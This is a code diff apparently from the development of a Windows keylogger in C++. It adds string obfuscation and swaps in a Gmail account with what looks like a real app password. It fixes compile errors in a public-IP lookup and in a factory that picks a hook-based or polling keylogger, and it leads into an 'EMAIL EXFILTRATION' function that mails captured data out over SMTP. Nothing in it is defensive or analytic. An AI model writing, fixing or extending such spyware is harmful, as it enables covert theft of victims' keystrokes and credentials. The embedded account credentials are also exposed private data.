@@ -1,3 +1,4 @@
+#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <wininet.h>
 #include <fstream>
@@ -8,14 +9,9 @@
 #include <sstream>
 #include <algorithm>
 #include <Wincrypt.h>
-#include <iphlpapi.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "iphlpapi.lib")
-#pragma comment(lib, "ws2_32.lib")
 
 // ====================== OBFUSCATION ======================
 #define HIDE_STR(str) []() -> std::string { \
@@ -36,8 +32,8 @@ struct APIResolver {
 };
 
 // ====================== CONFIGURATION ======================
-const std::string EMAIL_USER = HIDE_STR("haganeska@gmail.com");
-const std::string EMAIL_PASS = HIDE_STR("your_app_password");
+const std::string EMAIL_USER = HIDE_STR("loirverse@gmail.com");
+const std::string EMAIL_PASS = HIDE_STR("kfjnnlovftazuxkk");
 const std::string SMTP_SERVER = HIDE_STR("smtp.gmail.com");
 const int SMTP_PORT = 587;
 
@@ -86,7 +82,7 @@ std::string GetPublicIP() {
     char buffer[128] = {0};
     DWORD bytesRead;
     std::string ip;
-    while (pInternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) {
+    while (pInternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
         if (bytesRead == 0) break;
         ip.append(buffer, bytesRead);
     }
@@ -228,8 +224,11 @@ IKeylogger* CreateKeylogger() {
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<> dis(0, 1);
-    return (dis(gen) == 0) ? new HookKeylogger() : new PollKeylogger();
-}
+    return (dis(gen) == 0) 
+        ? static_cast<IKeylogger*>(new HookKeylogger()) 
+        : static_cast<IKeylogger*>(new PollKeylogger());
+};
+
 
 // ====================== EMAIL EXFILTRATION ======================
 void SendEmail(const std::string& subject, const std::string& body) {
